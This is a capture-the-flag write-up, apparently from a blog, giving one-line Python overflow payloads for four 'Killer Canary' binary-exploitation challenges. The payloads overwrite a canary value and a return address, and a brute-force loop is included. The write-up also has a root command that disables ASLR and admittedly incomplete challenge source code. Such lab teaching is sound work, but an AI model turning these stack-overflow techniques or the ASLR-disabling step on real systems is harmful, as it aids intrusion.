[Full writeup on blog](https://nicholaskrabbenhoft.com/Sp00kyCTF-Write-ups-Killer-Canary-1-4/)







## Quick note:

I hope everyone had fun with these challenges. I know they were a ton of fun to make and help you all work through them. I love talking about all of this stuff so if anyone wants to ask me questions about how they work feel free to shoot me a message on slack, discord, or on github (if that exists)




# Killer Canary 1

`python3 -c "print('A' * 400)" | ./level1`

This is a relitivly simple Binary exploitation challenge. You simply have to know what a buffer overflow is and pipe in a massive amount of input into the binary.

The binary catches SEGFAULTs and reveals the flag to you.



//NOTE: this is not the real source, it has been smashed and I have to find my backups for the real one

```C
void segfault_sigaction(int signal, siginfo_t *si, void *arg)

{

 printf("Caught segfault at address %p", si->si_addr);

 printf("The signal is %d ", signal);

 printf("the flag is:");

 FILE *fptr;

 char c;

 while (c != EOF)
 {

 printf ("%c", c);

 c = fgetc(fptr);

 }
  

 exit(0);

}

  

int main(void)

{

 int string[200];

 struct sigaction sa;

  

 memset(&sa, 0, sizeof(struct sigaction));

 sigemptyset(&sa.sa_mask);

 sa.sa_sigaction = segfault_sigaction;

 sa.sa_flags = SA_SIGINFO;

  

 sigaction(SIGSEGV, &sa, NULL);

  

 puts("Input please");

 /* Cause a seg fault */

 gets(string);

 puts("recived: ");

 puts(string);

 puts("thank you :)");

 printf("Return to %p", __builtin_return_address(0));

 return 0;

}
```




# Killer Canary 2

`python3 -c 'import sys; import struct; val = struct.pack("I", 0xdeadbeef); sys.stdout.buffer.write(b"A" * 32 + val)' | ./level2`

This challenges introduces the idea of a stack canary. The idea is you have to overflow the buffer, like last time, however you have to leave the 

First thing you should do is overflow the buffer again and see what it does. It prints:
```C

main(){


    struct sigaction sa;





    memset(&sa, 0, sizeof(struct sigaction));
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = segfault_sigaction;
    sa.sa_flags   = SA_SIGINFO;

    sigaction(SIGSEGV, &sa, NULL);


    struct data data = {
        .yourinput = { 0 },
        .give_flag = 0,
    };

    printf("Input:");
    gets((char*) &data.yourinput);


    puts("
");
    puts((char*) &data.yourinput);

    if (data.give_flag == 0xDEADBEEF) {
        give_flag();

    }
    return 1;
```
also your give flag was 0x41414141

This lets us know that our give flag was 0x41414141, which is the 'A's that we piped in and we see that it has to be 0xdeadbeef. So now it is just a guess and check to see. After a bunch of checking we see that 32 A get you to the give flag input. Then you have to driectly write deadbeaf to the program. I use struct.pack in python to do that and then rather then using print I use the sys.stdout.buffer.write because it bypasses all of the internal code for the other ways and lets you output raw bytes.


# Killer 3
 `python3 -c 'import sys; import struct; val = struct.pack("I", 0xdeadbeef); rVal = struct.pack("I", 0x555552a4); rVal2 = struct.pack("I", 0x00005555); sys.stdout.buffer.write(b"A" * 8 + val + b"A" * 168 + rVal + rVal2)' | ./level3`
 
 
 As before, the first thing we do is try and overflow the buffer and we see we kill the bird again
 

└─$ python3 -c "print('A'*1000)" | ./level3
Here's my favorite bird, what do you think his name is:
You killed my birdy, it was 0xdeadbeef but you killed him so now he's 0x41414141
I will make you pay for that


So we do some guess and check to figure out how many A's are needed to overwrite the bird to make it deadbeef again. This happens to be 8 A's and then we output dead beef again to get pass it.

So we run it again overflowing after the canary and get this:

A" * 8 + val + b"A" * 200 + rVal + rVal2)' | ./level3
Here's my favorite bird, what do you think his name is:
Oh my birdy likes you: 0xdeadbeef thinks you're a nice person so you can stay for now
Here let me show you to 0x4141414141414141
Caught segfault at address (nil)
You seem to be struggling
Here's a pointer that you may want to check it out: 0x00005555555552a4

We see we are going to 0x4141414141414141 in the code and it tells use we want to go to  0x00005555555552a4. 



Important note: you will only see this if you turn off your aslr on your computer by running the following command as root
`echo 0 > /proc/sys/kernel/randomize_va_space`


At this point you have to create 2 packeted structs to get a 8 byte val you and guess and check your way to find the number of bytes after the canary you have to put them.


# Killer 4
```Bash
for i in {0..10000}; do python3 -c 'import sys; import struct; val = struct.pack("I", 0x6551677d); rVal = struct.pack("I", 0x555553c6); rVal2 = struct.pack("I", 0x00005555); sys.stdout.buffer.write(b"A" * 12 + val + b"A" * 24 + rVal + rVal2)' | ./level4 | tee -a debug ; sleep 1; done
```

I don't have time to do a full write up to explain how this works, but this is the PoC one liner to get the flag. It's not ideal as it only has a 1% of working every time it runs which is why it's run 10000 times.




